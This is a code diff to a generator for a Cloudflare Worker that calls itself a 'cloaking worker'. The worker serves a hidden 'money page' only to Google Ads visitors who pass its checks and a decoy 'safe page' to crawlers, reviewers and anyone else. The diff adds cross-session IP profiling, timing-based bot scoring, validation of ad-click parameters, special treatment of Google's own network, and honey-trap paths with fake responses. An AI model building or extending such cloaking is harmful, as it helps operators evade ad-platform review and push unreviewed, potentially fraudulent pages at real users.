@@ -792,8 +792,8 @@ export function generateJciWorkerScript(options: {
   // Use fixed CDN path for consistency
   const selectedCdnPath = 'r8';
   
-  return `// ULTIMATE CLOAKING WORKER v3.0
-// Advanced bot detection with reverse proxy capabilities
+  return `// ULTIMATE CLOAKING WORKER v3.1
+// USA-optimized bot detection with multi-layered scoring and cross-session intelligence
 
 // KV Namespace binding - TRAFFIC_LOGS is automatically bound by Cloudflare
 // when the worker is deployed with KV binding configuration
@@ -832,6 +832,128 @@ const DATACENTER_ASNS = [
 
 const BLOCKED_COUNTRIES = ['CN', 'RU', 'IN', 'PK', 'BD', 'VN', 'IR', 'KP', 'BY'];
 const requestTracker = new Map();
+
+// Cross-Session Intelligence Storage
+const intelligenceStore = new Map();
+
+// Background Intelligence Gathering
+async function gatherIntelligence(request, ipData, decision) {
+  try {
+    const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
+    const userAgent = request.headers.get('User-Agent') || '';
+    const timestamp = Date.now();
+    
+    // Create intelligence key for this visitor
+    const visitorKey = 'intel_' + clientIP.replace(/[^a-zA-Z0-9]/g, '_');
+    
+    // Get existing intelligence or create new
+    let intel = intelligenceStore.get(visitorKey) || {
+      firstSeen: timestamp,
+      lastSeen: timestamp,
+      requestCount: 0,
+      decisions: [],
+      timingPatterns: [],
+      userAgents: new Set(),
+      behaviorFlags: []
+    };
+    
+    // Update intelligence
+    intel.lastSeen = timestamp;
+    intel.requestCount++;
+    intel.decisions.push({ decision, timestamp });
+    intel.userAgents.add(userAgent);
+    
+    // Timing analysis
+    if (intel.timingPatterns.length > 0) {
+      const lastRequest = intel.timingPatterns[intel.timingPatterns.length - 1];
+      const timeDiff = timestamp - lastRequest;
+      
+      // Detect suspicious timing patterns
+      if (timeDiff < 500) {
+        intel.behaviorFlags.push('rapid_requests');
+      }
+      if (timeDiff > 0 && timeDiff < 100) {
+        intel.behaviorFlags.push('inhuman_speed');
+      }
+      
+      // Check for mechanical intervals (bot behavior)
+      if (intel.timingPatterns.length >= 3) {
+        const intervals = [];
+        for (let i = 1; i < intel.timingPatterns.length; i++) {
+          intervals.push(intel.timingPatterns[i] - intel.timingPatterns[i-1]);
+        }
+        
+        // Check for suspiciously regular intervals
+        const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;
+        const variance = intervals.reduce((sum, interval) => sum + Math.pow(interval - avgInterval, 2), 0) / intervals.length;
+        
+        if (variance < 100000 && avgInterval > 500 && avgInterval < 10000) {
+          intel.behaviorFlags.push('mechanical_timing');
+        }
+      }
+    }
+    
+    intel.timingPatterns.push(timestamp);
+    
+    // Keep only last 10 timing entries to manage memory
+    if (intel.timingPatterns.length > 10) {
+      intel.timingPatterns = intel.timingPatterns.slice(-10);
+    }
+    
+    // Keep only last 20 decisions
+    if (intel.decisions.length > 20) {
+      intel.decisions = intel.decisions.slice(-20);
+    }
+    
+    // Store updated intelligence
+    intelligenceStore.set(visitorKey, intel);
+    
+    // Clean up old entries (every 100th request)
+    if (intel.requestCount % 100 === 0) {
+      const cutoffTime = timestamp - (24 * 60 * 60 * 1000); // 24 hours ago
+      for (const [key, data] of intelligenceStore.entries()) {
+        if (data.lastSeen < cutoffTime) {
+          intelligenceStore.delete(key);
+        }
+      }
+    }
+    
+  } catch (error) {
+    // Don't let intelligence gathering break main flow
+    console.error('Intelligence gathering error:', error);
+  }
+}
+
+// Enhanced Bot Score Calculation with Intelligence
+function calculateIntelligenceScore(clientIP) {
+  const visitorKey = 'intel_' + clientIP.replace(/[^a-zA-Z0-9]/g, '_');
+  const intel = intelligenceStore.get(visitorKey);
+  
+  if (!intel) return 0;
+  
+  let intelScore = 0;
+  
+  // Behavioral flag scoring
+  if (intel.behaviorFlags.includes('rapid_requests')) intelScore += 15;
+  if (intel.behaviorFlags.includes('inhuman_speed')) intelScore += 20;
+  if (intel.behaviorFlags.includes('mechanical_timing')) intelScore += 25;
+  
+  // Multiple user agents = suspicious
+  if (intel.userAgents.size > 3) intelScore += 10;
+  
+  // High request count in short time
+  const sessionDuration = intel.lastSeen - intel.firstSeen;
+  if (sessionDuration < 300000 && intel.requestCount > 10) { // 5 minutes, >10 requests
+    intelScore += 15;
+  }
+  
+  // Consistent bot decisions
+  const recentDecisions = intel.decisions.slice(-5);
+  const botDecisions = recentDecisions.filter(d => d.decision === 'safe_page').length;
+  if (botDecisions >= 4) intelScore += 20;
+  
+  return Math.min(intelScore, 30); // Cap at 30 points from intelligence
+}
 // --- END CONFIGURATION ---
 
 addEventListener('fetch', event => {
@@ -877,7 +999,40 @@ async function handleRequest(request) {
     }
   }
 
-  // ROUTE 1: Serve the advanced service worker with comprehensive blocking
+  // ROUTE 1: Honey Trap System - Catch bots probing common endpoints
+  const honeyTrapPaths = [
+    '/robots.txt', '/sitemap.xml', '/wp-admin', '/wp-login.php', '/admin', 
+    '/login', '/phpmyadmin', '/.env', '/config', '/api', '/wp-content',
+    '/uploads', '/backup', '/test', '/dev', '/.git', '/vendor', '/node_modules',
+    '/.well-known', '/security.txt', '/humans.txt', '/ads.txt', '/app-ads.txt'
+  ];
+  
+  if (honeyTrapPaths.some(trap => url.pathname.startsWith(trap))) {
+    // Log the bot attempt for intelligence
+    await logTrafficEvent(request, 'safe_page', { 
+      reason: 'honey_trap', 
+      trapPath: url.pathname,
+      behaviorPattern: 'endpoint_probing'
+    });
+    
+    // Return realistic responses to avoid detection
+    if (url.pathname === '/robots.txt') {
+      return new Response('User-agent: *\\nDisallow:', {
+        status: 200,
+        headers: { 'Content-Type': 'text/plain' }
+      });
+    } else if (url.pathname === '/sitemap.xml') {
+      return new Response('<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>', {
+        status: 200,
+        headers: { 'Content-Type': 'application/xml' }
+      });
+    } else {
+      // For other traps, return 404 to seem normal
+      return new Response('Not Found', { status: 404 });
+    }
+  }
+
+  // ROUTE 2: Serve the advanced service worker with comprehensive blocking
   if (url.pathname === '/service-worker.js') {
     const swCode = '// Service Worker Configuration - Use the same CDN path as main worker\\n' +
       'const CDN_PATH = \\'' + CDN_PATH + '\\';\\n\\n' +
@@ -1026,12 +1181,12 @@ async function handleRequest(request) {
     });
   }
 
-  // ROUTE 2: Handle proxied resource requests (for CSS, JS, images).
+  // ROUTE 3: Handle proxied resource requests (for CSS, JS, images).
   if (url.pathname.startsWith('/' + CDN_PATH + '/')) {
     return handleResourceRequest(request);
   }
   
-  // ROUTE 3: Handle the initial page load with cloaking logic.
+  // ROUTE 4: Handle the initial page load with cloaking logic.
   return handleMainRequest(request);
 }
 
@@ -1100,11 +1255,36 @@ async function isVisitorABot(request) {
   const url = new URL(request.url);
   
   try {
-    // STEP 0: Check for gclid parameter (Google Ads traffic)
+    // STEP 0: Enhanced Google Ads Traffic Validation
     const gclid = url.searchParams.get('gclid');
-    if (!gclid) {
-      await logTrafficEvent(request, 'safe_page', { reason: 'no_gclid' });
-      return true; // Show safe page for direct visits without gclid
+    const gbraid = url.searchParams.get('gbraid');
+    const wbraid = url.searchParams.get('wbraid');
+    
+    // Check for any Google Ads tracking parameter
+    if (!gclid && !gbraid && !wbraid) {
+      await logTrafficEvent(request, 'safe_page', { reason: 'no_ads_params' });
+      return true; // Show safe page for direct visits without any Google Ads parameters
+    }
+    
+    // Validate parameter quality (entropy analysis)
+    let botScore = 0;
+    const activeParam = gclid || gbraid || wbraid;
+    
+    // Add intelligence-based scoring from previous behavior
+    const intelligenceScore = calculateIntelligenceScore(clientIP);
+    botScore += intelligenceScore;
+    
+    if (activeParam) {
+      // Google Ads parameters should have sufficient entropy and proper format
+      if (activeParam.length < 20) {
+        botScore += 15; // Too short for real Google Ads parameter
+      }
+      if (!/[A-Za-z]/.test(activeParam) || !/[0-9]/.test(activeParam)) {
+        botScore += 10; // Missing letters or numbers
+      }
+      if (/^(.)\\1{5,}/.test(activeParam)) {
+        botScore += 20; // Repeating patterns indicate fake parameter
+      }
     }
 
     // STEP 1: Quick user agent pattern check (fastest)
@@ -1116,7 +1296,7 @@ async function isVisitorABot(request) {
       }
     }
 
-    // STEP 2: Combined geo + risk check with ProxyCheck.io (supports IPv4 & IPv6)
+    // STEP 2: Enhanced ProxyCheck.io analysis with ASN data
     const requestUrl = new URL(request.url);
     const domain = requestUrl.hostname;
     const pcUrl = 'https://proxycheck.io/v2/' + clientIP + '?key=' + PROXYCHECK_API_KEY + '&risk=1&asn=1&vpn=1&tag=' + encodeURIComponent('cloak-' + domain);
@@ -1124,52 +1304,80 @@ async function isVisitorABot(request) {
     const data = await response.json();
     const ipData = data[clientIP];
     
-
-
-    
     if (ipData) {
       const country = ipData.isocode || 'unknown';
       const riskScore = parseInt(ipData.risk) || 0;
       const isProxy = ipData.proxy === 'yes' || ipData.proxy === true;
       const isVpn = ipData.type === 'VPN' || (ipData.vpn && ipData.vpn === 'yes');
+      const asn = parseInt(ipData.asn) || 0;
       
-      // Check country first (geo check) - must be from target countries
-      // Use isocode (e.g., "NL") instead of country (e.g., "Netherlands") 
-      if (!ipData.isocode || !TARGET_COUNTRIES.includes(ipData.isocode)) {
-        await logTrafficEvent(request, 'safe_page', { 
-          reason: 'geo_block', 
-          country, 
-          riskScore, 
-          isProxy, 
-          isVpn 
-        });
-        return true; // Show safe page if no country code OR not in target countries
-      }
-      
-      // Only check risk score if geo passed
-      if (ipData.risk !== undefined) {
-        if (riskScore > 60) {
+      // USA-Optimized Detection: Can't use geo-blocking for USA traffic
+      if (TARGET_COUNTRIES.includes('US') && ipData.isocode === 'US') {
+        // For USA traffic, use enhanced detection since geo-blocking is useless
+        
+        // Check if this is Google's ASN (15169) - treat more carefully
+        if (asn === 15169) {
+          // Google's own infrastructure - increase threshold
+          if (riskScore > 75) {
+            botScore += 25;
+          }
+        } else {
+          // Non-Google USA traffic - standard thresholds
+          if (riskScore > 60) {
+            botScore += 20;
+          }
+        }
+        
+        // Check for datacenter ASNs (but be careful with Google's)
+        if (DATACENTER_ASNS.includes(asn) && asn !== 15169) {
+          botScore += 15;
+        }
+        
+      } else {
+        // Non-USA traffic - use geo-blocking
+        if (!ipData.isocode || !TARGET_COUNTRIES.includes(ipData.isocode)) {
           await logTrafficEvent(request, 'safe_page', { 
-            reason: 'high_risk', 
+            reason: 'geo_block', 
             country, 
             riskScore, 
             isProxy, 
-            isVpn 
+            isVpn,
+            asn 
           });
-          return true; // Show safe page if risk score > 60
+          return true; // Show safe page if not in target countries
+        }
+        
+        // Standard risk checking for allowed countries
+        if (riskScore > 60) {
+          botScore += 20;
         }
       }
       
-      // Check proxy status
+      // Universal checks regardless of country
       if (isProxy) {
+        botScore += 25; // High penalty for proxy usage
+      }
+      
+      if (isVpn) {
+        botScore += 20; // High penalty for VPN usage
+      }
+      
+      // Apply bot score threshold (40 points = bot)
+      if (botScore >= 40) {
         await logTrafficEvent(request, 'safe_page', { 
-          reason: 'proxy_detected', 
+          reason: 'high_bot_score', 
           country, 
           riskScore, 
           isProxy, 
-          isVpn 
+          isVpn,
+          asn,
+          botScore,
+          intelligenceScore 
         });
-        return true; // Show safe page for proxy traffic
+        
+        // Background intelligence gathering (async, non-blocking)
+        gatherIntelligence(request, ipData, 'safe_page').catch(() => {});
+        return true; // Show safe page for high bot score
       }
       
       // Passed all checks - show money page
@@ -1178,14 +1386,21 @@ async function isVisitorABot(request) {
         country, 
         riskScore, 
         isProxy, 
-        isVpn 
+        isVpn,
+        asn,
+        botScore,
+        intelligenceScore 
       });
+      
+      // Background intelligence gathering (async, non-blocking)
+      gatherIntelligence(request, ipData, 'money_page').catch(() => {});
     }
     
     return false; // Show money page for low risk visitors
 
   } catch (error) {
     await logTrafficEvent(request, 'safe_page', { reason: 'error', error: error.message });
+    gatherIntelligence(request, null, 'safe_page').catch(() => {}); // Learn from errors too
     return true; // Show safe page on any error
   }
 }
